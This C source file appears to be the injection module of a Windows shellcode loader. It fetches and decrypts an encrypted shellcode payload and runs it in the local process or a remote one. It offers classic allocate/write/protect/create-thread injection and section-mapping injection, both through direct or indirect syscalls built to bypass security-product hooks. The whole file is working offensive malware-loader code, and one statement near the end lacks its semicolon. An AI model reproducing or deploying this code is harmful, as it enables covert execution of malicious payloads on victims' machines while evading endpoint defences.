#include <windows.h>
#include "structs.h"
#include "main.h"


/*-----------------------------------------
  Get a handle to a remote process
-----------------------------------------*/
#ifdef REMOTE_INJECT
BOOL Open(IN DWORD pid, OUT PHANDLE hProc) {

    DEBUG_PRINT("[*] Opening process with pid: %d.\n", pid);

    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)pid;
    cid.UniqueThread = (HANDLE)0;

    OBJECT_ATTRIBUTES oattr;
    InitializeObjectAttributes(&oattr, NULL, 0, NULL, NULL);
#ifdef SYSCALL_INDIRECT
    GetSSNI(g_Fun.NtOpenProcess.dwSSn, g_Fun.NtOpenProcess.pSyscallIndJmp);
    NTSTATUS status = InvokeI(hProc, PROCESS_ALL_ACCESS, &oattr, &cid);

#elif !defined(SYSCALL_INDIRECT)
    GetSSND(g_Fun.NtOpenProcess.dwSSn);
    NTSTATUS status = InvokeD(hProc, PROCESS_ALL_ACCESS, &oattr, &cid);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Open proc failed: 0x%X.\n", status);
        return FALSE;
    }

    return TRUE;
}
#endif


/*-----------------------------------------------------------------------------------------------------------------
Classic injection based on: NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx
In order to change the technique the SC_FUNC struct is to be updated as well as the bellow payload function deffs.
-----------------------------------------------------------------------------------------------------------------*/
#ifndef MAPPING_INJECTION
BOOL RunClassic() {
    NTSTATUS status = NULL;
    PVOID addr = NULL;
    HANDLE hProcess = NULL,
        hThread = NULL;
    DWORD old = 0;


    //Local or remote injection
#ifdef REMOTE_INJECT

#ifdef PROC_NAME
    DWORD pid = 0;
    GetProcesses(PROC_NAME, &pid);
#elif !defined(PROC_NAME)
    DWORD pid = PID;
#endif

    if (!Open(pid, &hProcess)) {
        return FALSE;
    }
    DEBUG_PRINT("[*] Process Handle: 0x%p\n", hProcess);

#elif !defined(REMOTE_INJECT)
    hProcess = (HANDLE)-1;

#endif

    //Get the shellcode
    CONTENT cnt = { 0 };
    if (!GetSC(&cnt)) {
        DEBUG_PRINT("[!] Failed to get the shellcode.\n");
        return FALSE;
    }

    //Decrypt the shellcode
    if (!Dcrpt(&cnt)) {
        DEBUG_PRINT("[!] Failed decrypting the shellcode.\n");
        return FALSE;
    }


    SIZE_T scSize = (SIZE_T)cnt.size;
    DEBUG_PRINT("[*] Starting classic injection process.\n");

    //Allocate memory for shellcode storage
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtAllocateVirtualMemory.dwSSn, g_Fun.NtAllocateVirtualMemory.pSyscallIndJmp);
    status = InvokeI(hProcess, &addr, 0, &scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtAllocateVirtualMemory.dwSSn);
    status = InvokeD(hProcess, &addr, 0, &scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Allocation failed: 0x%X\n", status);
        return FALSE;
    }

    DEBUG_PRINT("[*] Allocated Memory address: 0x%p.\n", addr);

    //Write the shellcode to the allocated memory
    DWORD written = 0;
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtWriteVirtualMemory.dwSSn, g_Fun.NtWriteVirtualMemory.pSyscallIndJmp);
    status = InvokeI(hProcess, addr, cnt.data, cnt.size, &written);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtWriteVirtualMemory.dwSSn);
    status = InvokeD(hProcess, addr, cnt.data, cnt.size, &written);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Shellcode write failed: 0x%X\n", status);
        return FALSE;
    }

    DEBUG_PRINT("[*] Shellcode bytes written: %d.\n", written);

    //Change protection so the shellcode can be executed
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtProtectVirtualMemory.dwSSn, g_Fun.NtProtectVirtualMemory.pSyscallIndJmp);
    status = InvokeI(hProcess, &addr, &scSize, PAGE_EXECUTE_READ, &old);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtProtectVirtualMemory.dwSSn);
    status = InvokeD(hProcess, &addr, &scSize, PAGE_EXECUTE_READ, &old);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Changing memory protection failed: 0x%X.\n", status);
        return FALSE;
    }

    DEBUG_PRINT("[*] Creating new thread for shellcode execution.\n");

    //Execute the shellcode by create thread
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtCreateThreadEx.dwSSn, g_Fun.NtCreateThreadEx.pSyscallIndJmp);
    status = InvokeI(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, addr, NULL, FALSE, NULL, NULL, NULL, NULL);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtCreateThreadEx.dwSSn);
    status = InvokeD(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, addr, NULL, FALSE, NULL, NULL, NULL, NULL);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Failed creating thread: 0x%X.\n", status);
        return FALSE;
    }

    //Wait for thread to finish
#ifndef REMOTE_INJECT
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtWaitForSingleObject.dwSSn, g_Fun.NtWaitForSingleObject.pSyscallIndJmp);
    InvokeI(hThread, FALSE, NULL);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtWaitForSingleObject.dwSSn);
    InvokeD(hThread, FALSE, NULL);
#endif
#endif
    return TRUE;
}
#endif



/*-----------------------------------------------------
  Mapping injection technique based on:
  NtCreateSection, NtMapViewOfSection, NtCreateThreadEx
-----------------------------------------------------*/
#ifdef MAPPING_INJECTION
BOOL RunMap() {
    NTSTATUS status = NULL;
    PVOID lAddr = NULL,
        rAddr = NULL;
    HANDLE hProcess = NULL,
        hThread = NULL,
        hSection = NULL;
    DWORD old = 0;
    LARGE_INTEGER maxSize = { 0 };

    DEBUG_PRINT("[*] Starting mapping injection process.\n");

    //Local or remote injection
#ifdef REMOTE_INJECT

#ifdef PROC_NAME
    DWORD pid = 0;
    GetProcesses(PROC_NAME, &pid);
#elif !defined(PROC_NAME)
    DWORD pid = PID;
#endif

    if (!Open(pid, &hProcess)) {
        return FALSE;
    }
    DEBUG_PRINT("[*] Process Handle: 0x%p\n", hProcess);

#elif !defined(REMOTE_INJECT)
    hProcess = (HANDLE)-1;

#endif

    //Get the shellcode
    CONTENT cnt = { 0 };
    if (!GetSC(&cnt)) {
        DEBUG_PRINT("[!] Failed to get the shellcode.\n");
        return FALSE;
    }

    //Decrypt the shellcode
    if (!Dcrpt(&cnt)) {
        DEBUG_PRINT("[!] Failed decrypting the shellcode.\n");
        return FALSE;
    }

    //SIZE_T scSize = (SIZE_T)cnt.size;
    DEBUG_PRINT("[*] Creating a section for the shellcode.\n");

    maxSize.HighPart = 0;
    maxSize.LowPart = (SIZE_T)cnt.size;
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtCreateSection.dwSSn, g_Fun.NtCreateSection.pSyscallIndJmp);
    status = InvokeI(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtCreateSection.dwSSn);
    status = InvokeD(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Create section failed: 0x%X\n", status);
        return FALSE;
    }


    DEBUG_PRINT("[*] Mapping the section to the local process\n");
    SIZE_T sViewSize = 0;
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtMapViewOfSection.dwSSn, g_Fun.NtMapViewOfSection.pSyscallIndJmp);
    status = InvokeI(hSection, (HANDLE)-1, &lAddr, NULL, NULL, NULL, &sViewSize, 2, NULL, PAGE_EXECUTE_READWRITE);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtMapViewOfSection.dwSSn);
    status = InvokeD(hSection, (HANDLE)-1, &lAddr, NULL, NULL, NULL, &sViewSize, 2, NULL, PAGE_EXECUTE_READWRITE);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Mapping the section in local failed: 0x%X\n", status);
        return FALSE;
    }

    DEBUG_PRINT("[*] Copying the shellcode locally to: 0x%p.\n", lAddr);
    //Copy the shellcode
    mymemcpy(lAddr, cnt.data, cnt.size);


#ifdef REMOTE_INJECT
    DEBUG_PRINT("[*] Mapping the section in the remote process.\n");
    //Map the section in the remote process
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtMapViewOfSection.dwSSn, g_Fun.NtMapViewOfSection.pSyscallIndJmp);
    status = InvokeI(hSection, hProcess, &rAddr, NULL, NULL, NULL, &sViewSize, 2, NULL, PAGE_EXECUTE_READ);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtMapViewOfSection.dwSSn);
    status = InvokeD(hSection, hProcess, &rAddr, NULL, NULL, NULL, &sViewSize, 2, NULL, PAGE_EXECUTE_READ);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Mapping the section to remote failed: 0x%X\n", status);
        return FALSE;
    }
#endif


    //If local injection memory needs to be made executable
#ifdef REMOTE_INJECT
    PVOID scAddr = rAddr;

#elif !defined(REMOTE_INJECT)
    PVOID scAddr = lAddr;

    DEBUG_PRINT("[*] Making memory executable.\n");

    SIZE_T scSize = cnt.size;
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtProtectVirtualMemory.dwSSn, g_Fun.NtProtectVirtualMemory.pSyscallIndJmp);
    status = InvokeI(hProcess, &scAddr, &scSize, PAGE_EXECUTE_READ, &old);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtProtectVirtualMemory.dwSSn);
    status = InvokeD(hProcess, &scAddr, &scSize, PAGE_EXECUTE_READ, &old);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Changing memory protection failed: 0x%X\n", status);
        return FALSE;
    }

#endif


    DEBUG_PRINT("[*] Creating a thread to execute the shellcode from: 0x%p.\n", scAddr);
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtCreateThreadEx.dwSSn, g_Fun.NtCreateThreadEx.pSyscallIndJmp);
    status = InvokeI(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, scAddr, NULL, NULL, NULL, NULL, NULL, NULL);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtCreateThreadEx.dwSSn);
    status = InvokeD(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, scAddr, NULL, NULL, NULL, NULL, NULL, NULL);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Creating a new thread failed: 0x%X\n", status);
        return FALSE;
    }
    
    //If local injection wait for the thread to finish
#ifndef REMOTE_INJECT
#ifdef SYSCALL_INDIRECT
//Indirect syscall method
    GetSSNI(g_Fun.NtWaitForSingleObject.dwSSn, g_Fun.NtWaitForSingleObject.pSyscallIndJmp);
    InvokeI(hThread, FALSE, NULL);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtWaitForSingleObject.dwSSn);
    InvokeD(hThread, FALSE, NULL);
#endif
#endif

    //Closing handles
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtClose.dwSSn, g_Fun.NtClose.pSyscallIndJmp);
    InvokeI(hThread);
    InvokeI(hSection);
#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtClose.dwSSn);
    InvokeD(hThread);
    InvokeD(hSection)
#endif

        return TRUE;
}
#endif